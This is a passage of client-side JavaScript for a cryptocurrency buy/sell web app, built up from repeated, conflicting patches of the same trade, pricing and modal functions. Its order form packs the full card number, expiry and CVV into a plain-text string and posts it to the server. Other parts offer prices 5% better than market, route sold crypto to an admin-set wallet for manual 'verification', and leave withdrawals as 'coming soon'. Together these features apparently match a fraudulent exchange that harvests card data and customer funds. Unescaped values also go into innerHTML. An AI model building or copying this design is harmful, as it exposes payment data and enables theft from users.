    let modal = document.getElementById('paymentInstructionModal');
    if (modal) modal.remove(); // Remove existing if any

    modal = document.createElement('div');
    modal.id = 'paymentInstructionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    let address = "Contact Support (Address Not Set)";
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[coinSymbol]) {
        address = globalSettings.wallets[coinSymbol];
    }

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            
            <div style="width: 60px; height: 60px; background: rgba(0, 212, 170, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>

            <h2 style="color: #fff; margin-bottom: 10px; font-size: 22px;">Order Created</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px;">To complete your sale of <strong>$${usdAmount} USD</strong>, please send the exact amount below.</p>
            
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">Amount to Send</p>
                <h3 style="color: #00d4aa; margin: 0; font-size: 24px; font-weight: 800;">${cryptoAmount} ${coinSymbol}</h3>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">${coinSymbol} Deposit Address</p>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <div id="payInstAddress" style="flex: 1; font-family: monospace; font-size: 13px; color: #fff; word-break: break-all; text-align: left; background: #1a1a2a; padding: 10px; border-radius: 6px;">${address}</div>
                    <button onclick="copyPayAddress()" id="copyBtn" style="background: #333; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: bold;">Copy</button>
                </div>
            </div>

            <div style="background: rgba(246, 70, 93, 0.1); padding: 12px; border-radius: 8px; border: 1px solid rgba(246, 70, 93, 0.2); margin-bottom: 20px;">
                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.4;">⚠️ Your order is <strong>Pending</strong>. It will be processed after we verify the transaction on the blockchain.</p>
            </div>

            <button onclick="document.getElementById('paymentInstructionModal').remove(); showView('dashboardView');" style="background: #00d4aa; color: #000; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: 800; font-size: 16px; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    document.body.appendChild(modal);
    window._currentPayAddress = address;
}

window.copyPayAddress = function() {
    navigator.clipboard.writeText(window._currentPayAddress).then(() => {
        const btn = document.getElementById('copyBtn');
        btn.textContent = 'Copied!';
        btn.style.background = '#00d4aa';
        btn.style.color = '#000';
        setTimeout(() => { btn.textContent = 'Copy'; btn.style.background = '#333'; btn.style.color = '#fff'; }, 2000);
    });
};

/* =====================================================
   BINANCE-STYLE ASSETS LIST (With Hide Zero Toggle)
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        // Check if user prefers hiding zero balances
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';

        // Build the header with the Toggle
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 12px; color: #888;">
                    <span>Hide Zero Balances</span>
                    <div style="position: relative; width: 36px; height: 20px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0;">
                        <span style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#333'}; border-radius: 20px; transition: .4s;"></span>
                        <span style="position: absolute; content: ''; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; border-radius: 50%; transition: .4s; transform: ${hideZero ? 'translateX(16px)' : 'translateX(0)'};"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            
            // Skip if hideZero is true and amount is exactly 0
            if (hideZero && amount === 0) return;

            assetRowsHtml += `
                <div class="asset-row" onclick="showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer; transition: background 0.2s;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name} (${coin.symbol})</div>
                    <div class="asset-amount">${amount.toFixed(6)}</div>
                    <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>
            `;
        });

        // If all assets are zero and hideZero is true, show a message
        if (assetRowsHtml === '') {
            assetRowsHtml = `<p style="text-align: center; color: #666; padding: 20px 0; font-size: 14px;">No active balances found.</p>`;
        }

        assetsCard.innerHTML = html + assetRowsHtml;
        
        // Update total portfolio value at the top
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) totalEl.textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

        // Add event listener to the new toggle
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                localStorage.setItem('hideZeroBalances', e.target.checked);
                fetchBalances(); // Re-render the list instantly
            });
        }

    } catch (error) { console.log("Balance fetch error:", error); }
};

/* =====================================================
   GLOBAL CURRENCY & EXCHANGE SPREAD LOGIC
   ===================================================== */
const currencyMap = {
    "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 },
    "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 },
    "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 },
    "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 },
    "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 },
    "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 },
    "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 },
    "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 },
    "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 },
    "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 },
    "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 },
    "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 },
    "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 },
    "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 }
};

// 5% Platform Spread
const SPREAD = 0.05; 

function getUserCurrency() {
    // Fallback to USD if user is not logged in or country not found
    if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"];
    return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"];
}

// Get price adjusted for the Exchange Spread
function getExchangePrice(coin, mode) {
    if (mode === 'buy') {
        return coin.price * (1 + SPREAD); // User pays 5% more
    } else {
        return coin.price * (1 - SPREAD); // User receives 5% less
    }
}

window.setTradeMode = function(mode) {
    currentTradeMode = mode;
    const curr = getUserCurrency();
    
    document.getElementById('tabBuy').classList.toggle('active', mode === 'buy');
    document.getElementById('tabSell').classList.toggle('active', mode === 'sell');
    
    if (mode === 'buy') {
        document.getElementById('amountLabel').textContent = `Amount to Spend (${curr.code})`;
        document.getElementById('submitTradeBtn').textContent = 'Confirm Purchase';
        document.getElementById('submitTradeBtn').style.background = 'var(--success)';
        document.getElementById('receivingWalletContainer').style.display = 'block';
        document.getElementById('tradeAmount').placeholder = '0.00';
        document.getElementById('tradeReceive').previousElementSibling.textContent = 'You will receive (Crypto)';
    } else {
        document.getElementById('amountLabel').textContent = 'Amount to Sell (Crypto)';
        document.getElementById('submitTradeBtn').textContent = 'Confirm Sale';
        document.getElementById('submitTradeBtn').style.background = 'var(--danger)';
        document.getElementById('receivingWalletContainer').style.display = 'none';
        document.getElementById('tradeAmount').placeholder = '0.000000';
        document.getElementById('tradeReceive').previousElementSibling.textContent = `You will receive (${curr.code})`;
    }
    
    const methodSelect = document.getElementById('tradeMethod');
    methodSelect.innerHTML = `
        <option value="Credit Card">Credit / Debit Card</option>
        <option value="PayPal">PayPal</option>
        <option value="Bank Transfer">Bank Transfer</option>
    `;
    
    document.getElementById('tradeAmount').value = '';
    document.getElementById('tradeReceive').value = '';
    togglePaymentDetails(); 
    calcTrade();
};

window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') {
            // Buying: Convert local currency to USD, then get crypto at BUY price
            const usdAmount = amount / curr.rate;
            const cryptoAmount = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6);
            document.getElementById('tradeReceive').value = cryptoAmount + " " + coin.symbol;
        } else {
            // Selling: Get USD at SELL price, then convert to local currency
            const usdAmount = amount * getExchangePrice(coin, 'sell');
            const localAmount = (usdAmount * curr.rate).toFixed(2);
            document.getElementById('tradeReceive').value = `${curr.symbol} ${localAmount} ${curr.code}`;
        }
    } else {
        document.getElementById('tradeReceive').value = '';
    }
    updateAdminAddressDisplay();
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade $100 USD equivalent
    const usdEquivalent = currentTradeMode === 'buy' ? (inputAmount / curr.rate) : (inputAmount * getExchangePrice(coin, 'sell'));
    if (usdEquivalent < 100) return showToast(`Minimum trade is $100 USD equivalent (~${curr.symbol}${(100 * curr.rate).toFixed(0)} ${curr.code}).`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   HIGH-YIELD TRADE LOGIC (Customer Bonus)
   ===================================================== */
const BONUS_RATE = 0.05; // 5% Bonus for the customer

// Get price adjusted to give the customer a better deal
function getExchangePrice(coin, mode) {
    if (mode === 'buy') {
        // BUY: Price is 5% CHEAPER for the customer, so they get MORE crypto
        return coin.price * (1 - BONUS_RATE); 
    } else {
        // SELL: Price is 5% HIGHER for the customer, so they get MORE cash
        return coin.price * (1 + BONUS_RATE); 
    }
}

window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') {
            // Buying: Convert local currency to USD, then get crypto at the BONUS price
            const usdAmount = amount / curr.rate;
            const cryptoAmount = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6);
            document.getElementById('tradeReceive').value = cryptoAmount + " " + coin.symbol;
        } else {
            // Selling: Get USD at the BONUS price, then convert to local currency
            const usdAmount = amount * getExchangePrice(coin, 'sell');
            const localAmount = (usdAmount * curr.rate).toFixed(2);
            document.getElementById('tradeReceive').value = `${curr.symbol} ${localAmount} ${curr.code}`;
        }
    } else {
        document.getElementById('tradeReceive').value = '';
    }
    updateAdminAddressDisplay();
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // Minimum trade check ($100 USD equivalent)
    const usdEquivalent = currentTradeMode === 'buy' ? (inputAmount / curr.rate) : (inputAmount * getExchangePrice(coin, 'sell'));
    if (usdEquivalent < 100) return showToast(`Minimum trade is $100 USD equivalent (~${curr.symbol}${(100 * curr.rate).toFixed(0)} ${curr.code}).`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                // For sell, they are sending Crypto, and receiving Fiat
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   FIX: MINIMUM LIMIT OF 100 IN LOCAL CURRENCY
   ===================================================== */
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value);
    const coinSymbol = document.getElementById('tradeCoin').value;
    const method = document.getElementById('tradeMethod').value;
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A";
    const coin = markets.find(c => c.symbol === coinSymbol);
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount.");
    
    // NEW RULE: Check minimum in LOCAL currency
    if (currentTradeMode === 'buy') {
        // Buying: inputAmount IS the local fiat
        if (inputAmount < 100) {
            return showToast(`Minimum purchase is ${curr.symbol} 100 ${curr.code}.`);
        }
    } else {
        // Selling: inputAmount is Crypto. Calculate how much fiat they will get.
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        const localAmount = usdAmount * curr.rate;
        if (localAmount < 100) {
            return showToast(`Minimum sale value is ${curr.symbol} 100 ${curr.code}.`);
        }
    }
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const cardNum = document.getElementById('cardNumber').value; const expiry = document.getElementById('cardExpiry').value; const cvv = document.getElementById('cardCvv').value;
        if (cardNum.length < 15 || expiry.length < 4 || cvv.length < 3) return showToast("Please fill valid card details.");
        paymentDetails = `Card: ${cardNum} | Exp: ${expiry} | CVV: ${cvv}`;
    } else if (method === 'PayPal') {
        const email = document.getElementById('paypalEmail').value; if (!email.includes('@')) return showToast("Enter a valid PayPal email."); paymentDetails = `PayPal: ${email}`;
    } else {
        const bank = document.getElementById('bankAccount').value; if (!bank) return showToast("Enter bank details."); paymentDetails = `Bank: ${bank}`;
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter your receiving wallet address.");
    
    const token = localStorage.getItem('token');
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') {
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; 
        sendCurrency = curr.code;
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); 
        getCurrency = coinSymbol;
    } else {
        sendAmount = inputAmount; 
        sendCurrency = coinSymbol;
        const usdAmount = inputAmount * getExchangePrice(coin, 'sell');
        getAmount = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        getCurrency = curr.code;
    }
    
    const orderData = { 
        userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, 
        sendAmount: sendAmount, sendCurrency: sendCurrency, getAmount: getAmount, getCurrency: getCurrency, 
        method: method, paymentDetails: paymentDetails, receivingWallet: wallet 
    };

    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify(orderData) 
        });
        const data = await res.json();
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') {
                try { const setRes = await fetch('/api/admin/public/settings'); globalSettings = await setRes.json(); } catch(e) {}
                showPaymentInstructions(coinSymbol, sendAmount, orderData.getAmount);
            } else {
                showToast(`Order Placed! ID: ${data.orderId}`); 
                setTimeout(() => showView('dashboardView'), 2000); 
            }
        } else { showToast(data.message || "Failed to place order."); }
    } catch (error) { showToast("Error connecting to server."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   FIX: PROFESSIONAL PAYMENT MODAL (Removing double text)
   ===================================================== */
window.showPaymentInstructions = function(coinSymbol, cryptoAmount, formattedUsdAmount) {
    let modal = document.getElementById('paymentInstructionModal');
    if (modal) modal.remove(); // Remove existing if any

    modal = document.createElement('div');
    modal.id = 'paymentInstructionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    let address = "Contact Support (Address Not Set)";
    let addressColor = "#f6465d"; // Red if missing
    if (globalSettings && globalSettings.wallets && globalSettings.wallets[coinSymbol]) {
        address = globalSettings.wallets[coinSymbol];
        addressColor = "#fff"; // White if present
    }

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 25px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            
            <div style="width: 60px; height: 60px; background: rgba(0, 212, 170, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
            </div>

            <h2 style="color: #fff; margin-bottom: 10px; font-size: 22px;">Order Created</h2>
            <p style="color: #888; font-size: 14px; margin-bottom: 25px;">To complete your sale and receive <strong>${formattedUsdAmount}</strong>, please send the exact amount below.</p>
            
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">Amount to Send</p>
                <h3 style="color: #00d4aa; margin: 0; font-size: 24px; font-weight: 800;">${cryptoAmount} ${coinSymbol}</h3>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px;">
                <p style="color: #888; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px;">${coinSymbol} Deposit Address</p>
                <div style="display: flex; gap: 8px; align-items: center;">
                    <div style="flex: 1; font-family: monospace; font-size: 13px; color: ${addressColor}; word-break: break-all; text-align: left; background: #1a1a2a; padding: 10px; border-radius: 6px;">${address}</div>
                    <button onclick="copyPayAddress()" id="copyBtn" style="background: #333; color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: bold;">Copy</button>
                </div>
            </div>

            <div style="background: rgba(246, 70, 93, 0.1); padding: 12px; border-radius: 8px; border: 1px solid rgba(246, 70, 93, 0.2); margin-bottom: 20px;">
                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.4;">⚠️ Your order is <strong>Pending</strong>. It will be processed after we verify the transaction on the blockchain.</p>
            </div>

            <button onclick="document.getElementById('paymentInstructionModal').remove(); showView('dashboardView');" style="background: #00d4aa; color: #000; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: 800; font-size: 16px; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    document.body.appendChild(modal);
    window._currentPayAddress = address;
};

/* =====================================================
   ULTIMATE PROFESSIONAL ASSET MODAL (2x2 Grid)
   ===================================================== */
window.showAssetActions = function(symbol, name, amount, value) {
    let modal = document.getElementById('assetActionModal');
    
    if (modal) modal.remove(); // Remove old modal if it exists

    modal = document.createElement('div');
    modal.id = 'assetActionModal';
    modal.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: center; justify-content: center; padding: 20px;";
    
    modal.onclick = function(e) {
        if (e.target === modal) modal.remove();
    };

    modal.innerHTML = `
        <div style="background: #1a1a2a; border: 1px solid #2a2a3a; border-radius: 16px; padding: 30px 25px; width: 100%; max-width: 400px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
            
            <span onclick="document.getElementById('assetActionModal').remove()" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer; font-weight: bold;">&times;</span>
            
            <div id="assetModalIcon" style="width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.3);"></div>
            
            <h2 id="assetModalTitle" style="margin: 0 0 5px 0; color: #fff; font-size: 22px; font-weight: 700;"></h2>
            
            <div style="margin-bottom: 25px; margin-top: 15px;">
                <p style="color: #888; font-size: 13px; margin-bottom: 5px;">Total Balance</p>
                <h3 id="assetModalBalance" style="color: #fff; margin: 0; font-size: 18px;"></h3>
                <p id="assetModalValue" style="color: #00d4aa; margin: 5px 0 0 0; font-size: 14px; font-weight: 600;"></p>
            </div>

            <!-- 2x2 Action Grid -->
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                <button onclick="executeAssetAction('buy')" style="background: rgba(14, 203, 81, 0.1); color: #0ecb51; border: 1px solid #0ecb51; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.2s;">Buy</button>
                <button onclick="executeAssetAction('sell')" style="background: rgba(246, 70, 93, 0.1); color: #f6465d; border: 1px solid #f6465d; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.2s;">Sell</button>
                
                <button onclick="showToast('Deposit feature coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.2s;">Deposit</button>
                <button onclick="showToast('Withdraw feature coming soon!');" style="background: #2a2a3a; color: #fff; border: none; padding: 14px; border-radius: 10px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.2s;">Withdraw</button>
            </div>
        </div>
    `;

    // Populate Data
    const coin = markets.find(c => c.symbol === symbol);
    document.getElementById('assetModalIcon').style.background = coin.color;
    document.getElementById('assetModalIcon').innerHTML = coin.icon;
    document.getElementById('assetModalTitle').textContent = name;
    document.getElementById('assetModalBalance').textContent = `${amount.toFixed(6)} ${symbol}`;
    document.getElementById('assetModalValue').textContent = `≈ $${value.toFixed(2)} USD`;
    
    window._currentActionSymbol = symbol;
    document.body.appendChild(modal);
};

/* =====================================================
   BULLETPROOF ASSET LIST & MODAL (Fixes clicking issue)
   ===================================================== */
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0;">Your Assets</h3>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
        `;
        
        let totalValue = 0;
        let assetRowsHtml = '';

        markets.forEach(coin => {
            const amount = balances[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            
            // THIS IS THE CRUCIAL PART: The onclick must match the function exactly
            assetRowsHtml += `
                <div class="asset-row" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})" style="cursor: pointer; transition: background 0.2s; padding: 15px 0; border-bottom: 1px solid #2a2a3a;" onmouseover="this.style.background='#1a1a2a'" onmouseout="this.style.background='transparent'">
                    <div class="asset-name" style="display: flex; align-items: center; gap: 10px;">
                        <div class="market-icon" style="background:${coin.color}; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-size: 16px; color: white;">${coin.icon}</div> 
                        <span style="font-weight: 600; font-size: 14px;">${coin.name} (${coin.symbol})</span>
                    </div>
